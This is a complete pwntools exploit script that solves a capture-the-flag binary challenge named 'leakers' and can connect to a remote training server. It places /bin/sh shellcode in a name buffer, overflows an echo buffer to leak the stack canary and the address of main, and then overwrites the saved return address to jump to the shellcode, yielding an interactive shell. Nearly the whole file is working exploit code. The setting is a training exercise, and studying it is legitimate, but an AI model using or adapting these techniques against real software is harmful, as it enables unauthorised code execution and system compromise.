from pwn import *

CHALL_PATH = "./leakers"
CHALL = ELF(CHALL_PATH)
COMMANDS = """
brva 0x12f9
c
"""

context.arch = "amd64"

if args.GDB:
    c = gdb.debug(CHALL_PATH, COMMANDS)
    
elif args.REMOTE:
    c = remote("leakers.training.offensivedefensive.it", 8080, ssl=True)
    
else:
    c = process(CHALL_PATH)
    
    
name = asm(shellcraft.sh())
c.recvuntil(b"name?\n")
c.sendline(name)

payload = b"A" * (0x68 + 1) #to reach and leak the canary
c.recvuntil(b"Echo: ")
c.send(payload)

c.recvuntil(payload)
canary = u64(b"\x00" + c.recv(7))
print("Canary: ", hex(canary))

payload = b"A" * (0x68 + 6*8) #to reach the leaked main address
c.recvuntil(b"Echo: ")
c.send(payload)

c.recvuntil(payload)
leak = c.recv(6).ljust(8, b"\x00") #a leaked address is only 6 bytes cause of virtual memory
print(f'LEAK: {hex(u64(leak))}')
CHALL.address = u64(leak) - CHALL.symbols["main"]  #main_offset = 0x1229
print("MAIN: ", hex(CHALL.address))
print("PS1 @: ", hex(CHALL.symbols["ps1"]))

#to overwrite saved rip
payload = b"A" * (0x68)
payload += p64(canary)
payload += p64(0)   # value is useless, we just need something to overwrite the saved RBP
payload += p64(CHALL.symbols["ps1"])
c.recvuntil(b"Echo: ")
c.send(payload)

c.interactive()